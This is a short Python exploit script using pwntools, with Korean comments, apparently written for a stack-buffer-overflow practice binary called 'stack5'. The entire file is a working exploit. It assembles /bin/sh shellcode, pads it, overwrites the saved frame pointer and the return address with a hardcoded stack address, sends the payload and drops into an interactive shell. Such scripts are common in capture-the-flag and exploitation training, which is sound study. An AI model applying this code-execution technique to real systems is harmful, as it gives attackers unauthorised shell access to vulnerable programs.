from pwn import *

# 프로세스 실행
p = process('./stack5')
gdb.attach(p)

# 쉘코드 작성
shellcode = asm(shellcraft.sh())

padding = b'A' * (0x40 - len(shellcode))
address_ret = p64(0x7ffee2bbb490)

payload = padding + shellcode
payload += b'B' * 0x8
payload += address_ret


# 페이로드 전송
p.sendline(payload)

p.interactive()